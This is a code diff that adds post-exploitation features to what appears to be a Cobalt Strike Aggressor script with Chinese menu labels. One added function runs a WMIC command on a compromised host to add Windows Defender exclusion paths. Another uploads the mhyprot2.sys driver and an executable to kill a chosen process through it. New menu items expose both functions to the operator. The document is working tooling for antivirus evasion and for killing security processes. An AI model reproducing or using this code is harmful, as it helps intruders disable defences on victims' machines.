@@ -1,3 +1,11 @@
+sub DefenderBypass{
+    bshell($bid,"WMIC /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\'$3['path']\'");
+}
+sub MhyProtect{
+    bupload($bid,script_resource("bin/mhyprot2.Sys"));
+    bexecute_assembly($bid, script_resource("bin/MhyProt2Drv.exe"), "$3['pid']");
+
+}
 sub Send {
         $username = replace(beacon_info($bid,"user"),' \*',"");
         $msg = $3['msg'];
@@ -66,5 +74,21 @@ menu "小工具"{
             dbutton_action($add, "Run");
             dialog_show($add);
         }
+    item "Defender添加排除路径" {
+        $bid = $1;
+        $dialog = dialog("DefenderBypass", %(path => "",bid => $bid), &DefenderBypass);
+        dialog_description($dialog, "Defender添加排除路径");
+        drow_text($dialog,"path","path:");
+        dbutton_action($dialog, "Send");
+        dialog_show($dialog);
+    }
+    item "驱动K进程" {
+        $bid = $1;
+        $dialog = dialog("驱动K进程", %(pid => "",bid => $bid), &MhyProtect);
+        dialog_description($dialog, "驱动K进程");
+        drow_text($dialog,"pid","pid:");
+        dbutton_action($dialog, "Send");
+        dialog_show($dialog);
+    }
 
 }
